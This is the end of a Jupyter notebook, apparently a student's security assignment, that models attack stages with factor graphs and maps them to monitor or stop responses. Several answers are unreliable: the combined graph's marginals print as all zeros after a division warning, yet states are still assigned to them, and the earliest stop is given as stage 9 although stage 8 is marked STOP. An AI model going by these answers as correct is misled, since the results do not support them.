    "numcount=[]\n",
    "for i in range(len(ulist)):\n",
    "    numcount.append(countX(newlist, ulist[i])/len(newlist))\n",
    "\n",
    "df2 = pd.DataFrame({'Count':numcount,'Sequence':ulist})\n",
    "\n",
    "\n",
    "print(df2['Sequence'][df2['Count'].idxmax()])\n",
    "probsr=df2['Count'].max()\n",
    "print(probsr)\n",
    "df2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0.06647605432451752\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Count</th>\n",
       "      <th>Sequence</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>0</td>\n",
       "      <td>0.066476</td>\n",
       "      <td>(Sensitive_URI, Sensitive_URI, Sensitive_URI)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>1</td>\n",
       "      <td>0.002502</td>\n",
       "      <td>(Login, Login, Login)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>2</td>\n",
       "      <td>0.008935</td>\n",
       "      <td>(Scan, Scan, Scan)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>3</td>\n",
       "      <td>0.008935</td>\n",
       "      <td>(New_Kernel_Module, New_Kernel_Module, New_Ker...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>4</td>\n",
       "      <td>0.005361</td>\n",
       "      <td>(DNS_Tunneling, DNS_Tunneling, DNS_Tunneling)</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      Count                                           Sequence\n",
       "0  0.066476      (Sensitive_URI, Sensitive_URI, Sensitive_URI)\n",
       "1  0.002502                              (Login, Login, Login)\n",
       "2  0.008935                                 (Scan, Scan, Scan)\n",
       "3  0.008935  (New_Kernel_Module, New_Kernel_Module, New_Ker...\n",
       "4  0.005361      (DNS_Tunneling, DNS_Tunneling, DNS_Tunneling)"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "rlist=[]\n",
    "for i in range(len(ulist)):\n",
    "    flag=1\n",
    "    x=ulist[i][0]\n",
    "    for j in range(len(ulist[0])):\n",
    "        if ulist[i][j]!=x:\n",
    "            flag=0\n",
    "    if (flag==1):\n",
    "           rlist.append(ulist[i]) \n",
    "newcount=[]      \n",
    "for i in range(len(rlist)):\n",
    "    newcount.append(countX(newlist, rlist[i])/len(newlist))\n",
    "df3 = pd.DataFrame({'Count':newcount,'Sequence':rlist})\n",
    "probsc=df3['Count'][0]\n",
    "print(probsc)\n",
    "df3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As we can see (Sensitive_URI, Sensitive_URI, Sensitive_URI) occurs the most with probability of 0.066476 among repetitive sequences"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.2  You will have to submit the graph you draw through Compass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: e2: 100%|██████████████████████████| 1/1 [00:00<00:00, 333.36it/s]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| s2     |   phi(s2) |\n",
      "+========+===========+\n",
      "| s2(0)  |    0.9360 |\n",
      "+--------+-----------+\n",
      "| s2(1)  |    0.0640 |\n",
      "+--------+-----------+\n",
      "| s2(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s2(10) |    0.0000 |\n",
      "+--------+-----------+\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "G1 = FactorGraph() ## Create FactorGraph object\n",
    "###############################\n",
    "#   TODO: Define factor functions\n",
    "###############################\n",
    "\n",
    "f_2 = DiscreteFactor(['e2','s2'],[1,11],values=[0.936,0.064,0,0,0,0,0,0,0,0,0])\n",
    "\n",
    "\n",
    "#   TODO: Add random variables\n",
    "#         and factor functions \n",
    "###############################\n",
    "G1.add_nodes_from(['s2','e2'])  ## Add random variables \n",
    "G1.add_factors(f_2)     ## Add factor functions\n",
    "###############################\n",
    "#   TODO: Add the edges for random \n",
    "#   variables and factor functions\n",
    "###############################\n",
    "G1.add_edges_from([('s2', f_2),('e2', f_2)])\n",
    "###############################\n",
    "#   TODO: Do the inference\n",
    "###############################\n",
    "G1.check_model()\n",
    "nx.draw(G1,with_labels =True)\n",
    "bp = BeliefPropagation(G1)\n",
    "margin = bp.query(joint=False,variables=['s2'])\n",
    "print(margin['s2'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: e7: 100%|██████████████████████████| 1/1 [00:00<00:00, 333.62it/s]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| s7     |   phi(s7) |\n",
      "+========+===========+\n",
      "| s7(0)  |    0.8750 |\n",
      "+--------+-----------+\n",
      "| s7(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(5)  |    0.1250 |\n",
      "+--------+-----------+\n",
      "| s7(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s7(10) |    0.0000 |\n",
      "+--------+-----------+\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "G2 = FactorGraph() ## Create FactorGraph object\n",
    "###############################\n",
    "#   TODO: Define factor functions\n",
    "###############################\n",
    "f_7 = DiscreteFactor(['e7','s7'],[1,11],values=[0.875,0,0,0,0,0.125,0,0,0,0,0])\n",
    "#   TODO: Add random variables\n",
    "#         and factor functions \n",
    "###############################\n",
    "G2.add_nodes_from(['s7','e7'])  ## Add random variables \n",
    "G2.add_factors(f_7)     ## Add factor functions\n",
    "###############################\n",
    "#   TODO: Add the edges for random \n",
    "#   variables and factor functions\n",
    "###############################\n",
    "G2.add_edges_from([('s7', f_7),('e7', f_7)])\n",
    "###############################\n",
    "#   TODO: Do the inference\n",
    "###############################\n",
    "G2.check_model()\n",
    "nx.draw(G2,with_labels =True)\n",
    "bp = BeliefPropagation(G2)\n",
    "margin = bp.query(joint=False,variables=['s7'])\n",
    "print(margin['s7'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: e8: 100%|██████████████████████████| 1/1 [00:00<00:00, 500.04it/s]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| s8     |   phi(s8) |\n",
      "+========+===========+\n",
      "| s8(0)  |    0.0200 |\n",
      "+--------+-----------+\n",
      "| s8(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(8)  |    0.9800 |\n",
      "+--------+-----------+\n",
      "| s8(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s8(10) |    0.0000 |\n",
      "+--------+-----------+\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "G3 = FactorGraph() ## Create FactorGraph object\n",
    "###############################\n",
    "#   TODO: Define factor functions\n",
    "###############################\n",
    "f_8 = DiscreteFactor(['e8','s8'],[1,11],values=[0.02,0,0,0,0,0,0,0,0.98,0,0])\n",
    "#   TODO: Add random variables\n",
    "#         and factor functions \n",
    "###############################\n",
    "G3.add_nodes_from(['s8','e8'])  ## Add random variables \n",
    "G3.add_factors(f_8)     ## Add factor functions\n",
    "###############################\n",
    "#   TODO: Add the edges for random \n",
    "#   variables and factor functions\n",
    "###############################\n",
    "G3.add_edges_from([('s8', f_8),('e8', f_8)])\n",
    "###############################\n",
    "#   TODO: Do the inference\n",
    "###############################\n",
    "G3.check_model()\n",
    "nx.draw(G3,with_labels =True)\n",
    "bp = BeliefPropagation(G3)\n",
    "margin = bp.query(joint=False,variables=['s8'])\n",
    "print(margin['s8'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: e9: 100%|██████████████████████████| 1/1 [00:00<00:00, 333.54it/s]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| s9     |   phi(s9) |\n",
      "+========+===========+\n",
      "| s9(0)  |    0.0200 |\n",
      "+--------+-----------+\n",
      "| s9(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(8)  |    0.9800 |\n",
      "+--------+-----------+\n",
      "| s9(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s9(10) |    0.0000 |\n",
      "+--------+-----------+\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "G4 = FactorGraph() ## Create FactorGraph object\n",
    "###############################\n",
    "#   TODO: Define factor functions\n",
    "###############################\n",
    "f_9 = DiscreteFactor(['e9','s9'],[1,11],values=[0.02,0,0,0,0,0,0,0,0.98,0,0])\n",
    "#   TODO: Add random variables\n",
    "#         and factor functions \n",
    "###############################\n",
    "G4.add_nodes_from(['s9','e9'])  ## Add random variables \n",
    "G4.add_factors(f_9)     ## Add factor functions\n",
    "###############################\n",
    "#   TODO: Add the edges for random \n",
    "#   variables and factor functions\n",
    "###############################\n",
    "G4.add_edges_from([('s9', f_9),('e9', f_9)])\n",
    "###############################\n",
    "#   TODO: Do the inference\n",
    "###############################\n",
    "G4.check_model()\n",
    "nx.draw(G4,with_labels =True)\n",
    "bp = BeliefPropagation(G4)\n",
    "margin = bp.query(joint=False,variables=['s9'])\n",
    "print(margin['s9'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "G = FactorGraph() ## Create FactorGraph object\n",
    "###############################\n",
    "#   TODO: Define factor functions\n",
    "###############################\n",
    "f_1 = DiscreteFactor(['e1','s1'],[1,11],values=[0.936,0.064,0,0,0,0,0,0,0,0,0])\n",
    "#f_2 = DiscreteFactor(['e2','s2'],[1,11],values=[0.936,0.064,0,0,0,0,0,0,0,0,0])\n",
    "f_3 = DiscreteFactor(['e3','s3'],[1,11],values=[1,0,0,0,0,0,0,0,0,0,0])\n",
    "f_4 = DiscreteFactor(['e4','s4'],[1,11],values=[0.553333,0,0,0,0.446667,0,0,0,0,0,0])\n",
    "f_5 = DiscreteFactor(['e5','s5'],[1,11],values=[0.553333,0,0,0,0.446667,0,0,0,0,0,0])\n",
    "f_6 = DiscreteFactor(['e6','s6'],[1,11],values=[0.875,0,0,0,0,0.125,0,0,0,0,0])\n",
    "#f_7 = DiscreteFactor(['e7','s7'],[1,11],values=[0.875,0,0,0,0,0.125,0,0,0,0,0])\n",
    "#f_8 = DiscreteFactor(['e8','s8'],[1,11],values=[0.02,0,0,0,0,0,0,0,0.98,0,0])\n",
    "#f_9 = DiscreteFactor(['e9','s9'],[1,11],values=[0.02,0,0,0,0,0,0,0,0.98,0,0])\n",
    "\n",
    "r = DiscreteFactor(['e3','e4','e5','s5'],[1,1,1,11],values=[0,0,0,0,0,1,0,0,0,0,0])\n",
    "c = DiscreteFactor(['e1','e3','e6','s6'],[1,1,1,11],values=[0,0,0,0,1,0,0,0,0,0,0])\n",
    "###############################\n",
    "#   TODO: Add random variables\n",
    "#         and factor functions \n",
    "###############################\n",
    "G.add_nodes_from(['s1','e1','s3','e3','s4','e4','s5','e5','s6','e6'])  ## Add random variables \n",
    "G.add_factors(f_1,f_3,f_4,f_5,f_6,r,c)     ## Add factor functions\n",
    "###############################\n",
    "#   TODO: Add the edges for random \n",
    "#   variables and factor functions\n",
    "###############################\n",
    "G.add_edges_from([('s1', f_1),('e1', f_1),('s3', f_3),('e3', f_3),('s4', f_4),('e4', f_4),('s5', f_5),('e5', f_5),('s6', f_6),('e6', f_6),('e3', r),('e4', r),('e5', r),('s5', r),('e1', c),('e3', c),('e6', c),('s6', c)])\n",
    "\n",
    "###############################\n",
    "#   TODO: Do the inference\n",
    "###############################\n",
    "G.check_model()\n",
    "nx.draw(G,with_labels =True)\n",
    "bp = BeliefPropagation(G)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.4\n",
    "#### a. At every time point, provide the marginal probability of each state (Since we have 9 time points and 11 possible states, you should provide 99 probability values here)\n",
    "(s2,s7,s8,s9) has their conditional table provided above"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ge\\Anaconda3\\lib\\site-packages\\pgmpy\\factors\\discrete\\DiscreteFactor.py:697: RuntimeWarning: invalid value encountered in true_divide\n",
      "  phi.values = phi.values / phi1.values\n",
      "Eliminating: e1: 100%|██████████████████████████| 1/1 [00:00<00:00, 333.49it/s]\n",
      "Eliminating: e3: 100%|██████████████████████████| 1/1 [00:00<00:00, 333.54it/s]\n",
      "Eliminating: e4: 100%|██████████████████████████| 1/1 [00:00<00:00, 500.22it/s]\n",
      "Eliminating: e5: 100%|██████████████████████████| 3/3 [00:00<00:00, 300.18it/s]\n",
      "Eliminating: e3: 100%|██████████████████████████| 3/3 [00:00<00:00, 230.91it/s]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+--------+-----------+\n",
      "| s1     |   phi(s1) |\n",
      "+========+===========+\n",
      "| s1(0)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s1(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "+--------+-----------+\n",
      "| s3     |   phi(s3) |\n",
      "+========+===========+\n",
      "| s3(0)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s3(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "+--------+-----------+\n",
      "| s4     |   phi(s4) |\n",
      "+========+===========+\n",
      "| s4(0)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s4(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "+--------+-----------+\n",
      "| s5     |   phi(s5) |\n",
      "+========+===========+\n",
      "| s5(0)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s5(10) |    0.0000 |\n",
      "+--------+-----------+\n",
      "+--------+-----------+\n",
      "| s6     |   phi(s6) |\n",
      "+========+===========+\n",
      "| s6(0)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(1)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(2)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(3)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(4)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(5)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(6)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(7)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(8)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(9)  |    0.0000 |\n",
      "+--------+-----------+\n",
      "| s6(10) |    0.0000 |\n",
      "+--------+-----------+\n"
     ]
    }
   ],
   "source": [
    "margin1 = bp.query(joint=True,variables=['s1'])\n",
    "margin3 = bp.query(joint=True,variables=['s3'])\n",
    "margin4 = bp.query(joint=True,variables=['s4'])\n",
    "margin5 = bp.query(joint=True,variables=['s5'])\n",
    "margin6 = bp.query(joint=True,variables=['s6'])\n",
    "print(margin1)\n",
    "print(margin3)\n",
    "print(margin4)\n",
    "print(margin5)\n",
    "print(margin6)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### b. At every time point, provide the most probable state"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "s1:benign\n",
    "\n",
    "s2:benign\n",
    "\n",
    "s3:benign\n",
    "\n",
    "s4:benign\n",
    "\n",
    "s5:Privilege escalation\n",
    "\n",
    "s6:persistence\n",
    "\n",
    "s7:benign\n",
    "    \n",
    "s8:exfiltration\n",
    "    \n",
    "s9:exfiltration"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.5\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "ACTIONS = {\n",
    "    # each value in an actions' vector corresponds to an attack stage\n",
    "    'NO-OP':   [1.,   0.61, 0.69, 0.09, 0.2 , 0. ,  0.,   0.,   0. ,  0. ,  0.  ],\n",
    "    'MONITOR': [0.  , 0.39, 0.31 ,0.84, 0.63, 0.7,  0.07 ,0.1 , 0. ,  0. ,  0.  ],\n",
    "    'STOP':    [0.  , 0.,   0.  , 0.07, 0.17, 0.3,  0.93 ,0.9 , 1. ,  1. ,  1.  ]\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Given the action stage, we can infer that for each stage the corresbonding vectors are:\n",
    "\n",
    "s1:NO-OP\n",
    "\n",
    "s2:NO-OP\n",
    "\n",
    "s3:NO-OP\n",
    "\n",
    "s4:NO-OP\n",
    "\n",
    "s5:MONITOR\n",
    "\n",
    "s6:MONITOR\n",
    "\n",
    "s7:NO-OP\n",
    "    \n",
    "s8:STOP\n",
    "    \n",
    "s9:STOP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Indicate the earliest stage in which your model should recommend stopping the attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From the information above we can tell the first stage for stop should be stage 9"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 3.8"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### a. Draw an HMM model for the attack scenario given the provided states and events.\n",
    "Provided in the presentation file\n",
    "#### b. What parameters are needed for this HMM model to work?\n",
    "Transition state matrix; emission state matrix; initial possibilities\n",
    "\n",
    "#### c. Give an example of an advantage of the FG over the HMM model.\n",
    "Factor Graphs can have factor functions for modeling any number of dependencies while HMM assumes its future state only depends on current state"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
